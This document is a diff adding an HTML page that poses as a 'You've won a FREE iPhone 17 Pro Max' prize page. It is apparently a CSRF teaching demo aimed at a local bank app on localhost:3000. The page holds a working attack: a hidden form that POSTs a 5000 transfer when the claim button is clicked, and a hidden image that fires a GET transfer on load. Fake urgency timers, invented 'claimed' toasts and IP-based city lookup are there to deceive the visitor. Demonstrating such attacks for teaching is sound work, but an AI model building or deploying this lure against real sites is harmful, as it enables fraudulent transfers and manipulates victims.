@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>You've won a FREE iPhone 17 Pro Max! 🎉</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+  <iframe name="hiddenFrame" style="display:none;"></iframe>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: 'DM Sans', sans-serif;
+      /* Upgraded UI: Deeper, richer gradient for a premium feel */
+      background: radial-gradient(circle at top right, #2a0845, #0a0a2e, #110320);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      position: relative;
+      overflow: hidden; /* Prevent scrolling when confetti flies */
+    }
+
+    /* Secret Presenter Toggle Trigger (Top Left Corner) */
+    .secret-trigger {
+      position: fixed;
+      top: 0; left: 0;
+      width: 50px; height: 50px;
+      z-index: 9999;
+      cursor: default;
+    }
+
+    /* Social Proof Toasts Container */
+    #toast-container {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      z-index: 50;
+    }
+
+    .toast {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      border-left: 4px solid #f59e0b;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      transform: translateX(-150%);
+      transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.5s;
+      opacity: 0;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    }
+    .toast.show { transform: translateX(0); opacity: 1; }
+
+    /* Confetti Canvas */
+    #confetti-canvas {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      pointer-events: none;
+      z-index: 100;
+    }
+
+    /* One iPhone art on the left, one on the right — center column stays readable */
+    .side-fixed {
+      position: fixed;
+      top: 50%;
+      transform: translateY(-50%);
+      width: min(26vw, 220px);
+      max-height: 70vh;
+      height: auto;
+      object-fit: contain;
+      z-index: 0;
+      pointer-events: none;
+      opacity: 0.95;
+      filter: drop-shadow(0 0 30px rgba(245, 158, 11, 0.2)); /* Upgraded UI: Added glow to images */
+    }
+
+    .side-fixed.left { left: clamp(400px, 3vw, 32px); }
+    .side-fixed.right { right: clamp(400px, 3vw, 32px); left: auto; }
+
+    @media (max-width: 900px) {
+      .side-fixed { width: min(20vw, 120px); max-height: 45vh; }
+    }
+    @media (max-width: 600px) {
+      .side-fixed { display: none; }
+    }
+
+    .page {
+      text-align: center;
+      max-width: 560px;
+      padding: 60px 40px;
+      position: relative;
+      z-index: 1;
+      background: rgba(0, 0, 0, 0.3); /* Upgraded UI: Glassmorphism base */
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 24px;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+    }
+
+    .emoji { font-size: 5rem; margin-bottom: 20px; animation: bounce 1s ease infinite; }
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-12px); }
+    }
+
+    h1 {
+      font-family: 'Syne', sans-serif;
+      font-size: 2.2rem;
+      font-weight: 800;
+      color: #f59e0b;
+      margin-bottom: 16px;
+      text-shadow: 0 2px 10px rgba(245, 158, 11, 0.3);
+    }
+
+    p {
+      color: rgba(255,255,255,0.8);
+      font-size: 1.05rem;
+      line-height: 1.6;
+      margin-bottom: 32px;
+    }
+
+    .claim-btn {
+      display: inline-block;
+      padding: 18px 48px;
+      background: linear-gradient(135deg, #f59e0b, #d97706);
+      color: #000;
+      font-family: 'Syne', sans-serif;
+      font-weight: 800;
+      font-size: 1.1rem;
+      letter-spacing: 0.5px;
+      border: none;
+      border-radius: 100px;
+      cursor: pointer;
+      animation: glow-pulse 2s ease infinite;
+      transition: transform 0.2s, filter 0.2s;
+    }
+    .claim-btn:hover {
+      transform: scale(1.05);
+      filter: brightness(1.1);
+    }
+
+    @keyframes glow-pulse {
+      0%, 100% { box-shadow: 0 0 20px rgba(245,158,11,0.4); }
+      50% { box-shadow: 0 0 40px rgba(245,158,11,0.8); }
+    }
+
+    .timer {
+      margin-top: 24px;
+      font-size: 0.9rem;
+      color: rgba(255,255,255,0.5);
+    }
+    .timer span { color: #ef4444; font-weight: 700; }
+
+    /* ── Hidden attacker UI (developer view) ─── */
+    .dev-panel-wrapper {
+      display: none; /* Feature 1: Theatrical Veil (Hidden by default) */
+    }
+    .dev-panel-wrapper.active {
+      display: block;
+      animation: fadeIn 0.4s ease forwards;
+    }
+
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+    .dev-panel {
+      margin-top: 40px;
+      background: rgba(0,0,0,0.7);
+      border: 1px solid rgba(239,68,68,0.4);
+      border-radius: 16px;
+      padding: 24px;
+      text-align: left;
+      position: relative;
+    }
+
+    .dev-panel h3 {
+      font-family: 'Syne', sans-serif;
+      color: #ef4444;
+      font-size: 0.85rem;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      margin-bottom: 16px;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .code-block {
+      background: #0a0a0a;
+      border: 1px solid rgba(255,255,255,0.08);
+      border-radius: 10px;
+      padding: 16px;
+      font-family: 'Courier New', monospace;
+      font-size: 0.78rem;
+      color: #86efac;
+      line-height: 1.8;
+      overflow-x: auto;
+      white-space: pre;
+      margin-bottom: 16px;
+    }
+
+    /* Feature 4: The Phantom Ledger (Terminal UI) */
+    .ledger {
+      background: #050505;
+      border: 1px solid #333;
+      border-radius: 8px;
+      height: 120px;
+      overflow-y: auto;
+      padding: 12px;
+      font-family: 'Courier New', monospace;
+      font-size: 0.75rem;
+      color: #a3a3a3;
+    }
+    .ledger .req { color: #3b82f6; }
+    .ledger .cookie { color: #ef4444; font-weight: bold; }
+    .ledger .success-log { color: #22c55e; }
+
+    .comment { color: #6b7280; }
+    .tag { color: #93c5fd; }
+    .attr { color: #fde68a; }
+    .val { color: #86efac; }
+
+    #attackStatus {
+      margin-top: 16px;
+      padding: 14px 16px;
+      border-radius: 10px;
+      font-size: 0.875rem;
+      font-weight: 500;
+      display: none;
+    }
+
+    .status-pending { background: rgba(245,158,11,0.1); border: 1px solid rgba(245,158,11,0.2); color: #f59e0b; display: block !important; }
+    .status-success { background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.2); color: #ef4444; display: block !important; }
+  </style>
+</head>
+<body>
+
+<div class="secret-trigger" ondblclick="toggleDevPanel()" title="Shh... Double click me"></div>
+
+<div id="toast-container"></div>
+
+<canvas id="confetti-canvas"></canvas>
+
+<img 
+  src="http://localhost:3000/transfer-get?amount=3000&recipient=image_hacker"
+  style="width:1px; height:1px; opacity:0;"
+>
+<img src="/assets/iphone.png" class="side-fixed left" onerror="this.style.display='none'">
+<img src="/assets/iphone.png" class="side-fixed right" onerror="this.style.display='none'">
+
+<div class="page">
+  <div class="emoji">🎁</div>
+  <h1>You've Won!</h1>
+  <p>
+    Congratulations! You've been selected from <span id="geo-location" style="color:#86efac; font-weight:bold;">your city</span> to receive a FREE<br/>
+    <strong style="color:#f59e0b;">iPhone 17 Pro Max — 512GB</strong><br/>
+    Click below to claim your prize before the timer runs out!
+  </p>
+  <div class="cta-row">
+    <button class="claim-btn" onclick="triggerAttack()">
+      🎉 Claim My Prize Now!
+    </button>
+  </div>
+  <div class="timer">⏱ Offer expires in <span id="countdown">00:59</span></div>
+
+  <form id="csrfForm" action="http://localhost:3000/transfer" method="POST" target="hiddenFrame" style="display:none;">
+    <input type="hidden" name="amount"    value="5000" />
+    <input type="hidden" name="recipient" value="reva_shukla_chor" />
+    </form>
+
+  <div class="dev-panel-wrapper" id="devWrapper">
+    <div class="dev-panel">
+      <h3>🔴 Attack Payload (Presenter View) <span style="font-size:0.6rem; color:#666;">Press Ctrl+Shift+H</span></h3>
+
+      <div class="code-block"><span class="comment">&lt;!-- Hidden form — victim never sees this --&gt;</span>
+<span class="tag">&lt;form</span> <span class="attr">action=</span><span class="val">"http://localhost:3000/transfer"</span>
+      <span class="attr">method=</span><span class="val">"POST"</span>
+      <span class="attr">style=</span><span class="val">"display:none"</span><span class="tag">&gt;</span>
+
+  <span class="tag">&lt;input</span> <span class="attr">name=</span><span class="val">"amount"</span>    <span class="attr">value=</span><span class="val">"5000"</span>        <span class="tag">/&gt;</span>
+  <span class="tag">&lt;input</span> <span class="attr">name=</span><span class="val">"recipient"</span> <span class="attr">value=</span><span class="val">"reva_shukla_chor"</span> <span class="tag">/&gt;</span>
+  <span class="comment">&lt;!-- No csrf_token — attacker can't guess it --&gt;</span>
+
+<span class="tag">&lt;/form&gt;</span></div>
+
+      <div class="ledger" id="phantomLedger">
+        [SYSTEM] Awaiting victim interaction...<br>
+      </div>
+
+      <div id="attackStatus"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // ── Feature 1: Theatrical Veil (Toggle Dev Panel) ─────────
+  function toggleDevPanel() {
+    const wrapper = document.getElementById('devWrapper');
+    wrapper.classList.toggle('active');
+  }
+  // Keyboard shortcut (Ctrl + Shift + H)
+  document.addEventListener('keydown', (e) => {
+    if (e.ctrlKey && e.shiftKey && (e.key === 'H' || e.key === 'h')) {
+      toggleDevPanel();
+    }
+  });
+
+  // ── Feature 5: Geolocation Whisperer ──────────────────────
+  async function fetchLocation() {
+    try {
+      const response = await fetch('https://ipapi.co/json/');
+      const data = await response.json();
+      if (data.city) {
+        document.getElementById('geo-location').textContent = data.city;
+      }
+    } catch (e) {
+      // Silent fail, falls back to default text
+      console.log("Geo whisperer muted.");
+    }
+  }
+  fetchLocation();
+
+  // ── Feature 2: Echoes of the Duped (Social Proof) ─────────
+  const names = ["Aarav", "Priya", "Rahul", "Neha", "Vikram", "Ananya", "Rohan", "Sneha"];
+  const cities = ["Mumbai", "Delhi", "Bengaluru", "Pune", "Chennai", "Hyderabad"];
+  
+  function triggerFakeToast() {
+    const name = names[Math.floor(Math.random() * names.length)];
+    const city = cities[Math.floor(Math.random() * cities.length)];
+    const container = document.getElementById('toast-container');
+    
+    const toast = document.createElement('div');
+    toast.className = 'toast';
+    toast.innerHTML = `🌟 <strong>${name}</strong> from ${city} just claimed their iPhone!`;
+    
+    container.appendChild(toast);
+    
+    // Animate in
+    setTimeout(() => toast.classList.add('show'), 100);
+    
+    // Animate out and remove
+    setTimeout(() => {
+      toast.classList.remove('show');
+      setTimeout(() => toast.remove(), 500);
+    }, 4000);
+  }
+  // Start the lie machine
+  setInterval(() => {
+    if (Math.random() > 0.4) triggerFakeToast(); // Random intervals
+  }, 3500);
+
+  // ── Feature 3: Confetti Smokescreen ───────────────────────
+  const canvas = document.getElementById('confetti-canvas');
+  const ctx = canvas.getContext('2d');
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+  let particles = [];
+
+  function createParticles() {
+    for (let i = 0; i < 150; i++) {
+      particles.push({
+        x: canvas.width / 2,
+        y: canvas.height / 2,
+        r: Math.random() * 6 + 2,
+        dx: Math.random() * 10 - 5,
+        dy: Math.random() * -10 - 5,
+        color: `hsl(${Math.random() * 360}, 100%, 50%)`,
+        tilt: Math.random() * 10
+      });
+    }
+  }
+
+  function animateConfetti() {
+    requestAnimationFrame(animateConfetti);
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    particles.forEach((p, index) => {
+      p.dy += 0.2; // Gravity
+      p.x += p.dx;
+      p.y += p.dy;
+      p.tilt += 0.1;
+      
+      ctx.beginPath();
+      ctx.lineWidth = p.r;
+      ctx.strokeStyle = p.color;
+      ctx.moveTo(p.x + p.tilt + p.r, p.y);
+      ctx.lineTo(p.x + p.tilt, p.y + p.tilt + p.r);
+      ctx.stroke();
+
+      if (p.y > canvas.height) particles.splice(index, 1);
+    });
+  }
+  animateConfetti(); // Start loop
+
+  // ── Feature 4: The Phantom Ledger (Log Simulation) ────────
+  function simulateLedgerTraffic() {
+    const ledger = document.getElementById('phantomLedger');
+    const logs = [
+      `<span class="req">POST</span> /transfer HTTP/1.1`,
+      `Host: localhost:3000`,
+      `Content-Type: application/x-www-form-urlencoded`,
+      `<span class="cookie">Cookie: sessionId=a9f8b7c6d5e4f3g2h1</span> <i>(Stolen silently!)</i>`,
+      `...`,
+      `Body: amount=5000&recipient=reva_shukla_chor`,
+      `<span class="success-log">[200 OK]</span> Transaction authorized by bank.`
+    ];
+    
+    let i = 0;
+    ledger.innerHTML += "<br/>> Intercepting browser traffic...<br/>";
+    
+    const interval = setInterval(() => {
+      if (i < logs.length) {
+        ledger.innerHTML += `> ${logs[i]}<br/>`;
+        ledger.scrollTop = ledger.scrollHeight; // Auto-scroll
+        i++;
+      } else {
+        clearInterval(interval);
+      }
+    }, 400);
+  }
+
+  // ── Countdown timer (fake urgency lure) ─────────────────
+  let seconds = 59;
+  setInterval(() => {
+    document.getElementById('countdown').textContent =
+      '00:' + String(seconds--).padStart(2, '0');
+    if (seconds < 0) seconds = 59;
+  }, 1000);
+
+  // ── Execute CSRF attack ──────────────────────────────────
+  async function triggerAttack() {
+    const statusEl = document.getElementById('attackStatus');
+    statusEl.className = 'status-pending';
+    statusEl.textContent = '⏳ Sending forged request to bank...';
+
+    // Unleash the visual deception
+    createParticles();
+    
+    // Start the network simulation in dev view
+    simulateLedgerTraffic();
+
+    /*
+     * APPROACH 1 — Traditional Form Submit (most compatible, Burp-friendly)
+     * This is the classic CSRF vector: a cross-site HTML form POST.
+     * It is also the easiest to demonstrate in Burp as a raw POST /transfer.
+     */
+     statusEl.className = 'status-success';
+      statusEl.innerHTML = `
+        🎉 <strong>Congratulations!</strong><br/>
+        Your iPhone 17 Pro Max is on the way...<br/><br/>
+        <span style="color:#ef4444;">April Fools 😈</span><br/>
+        <small style="opacity:0.7;">
+        </small>
+      `;
+
+    // The quiet execution in the background
+    document.getElementById('csrfForm').submit();
+  }
+</script>
+
+</body>
+</html>
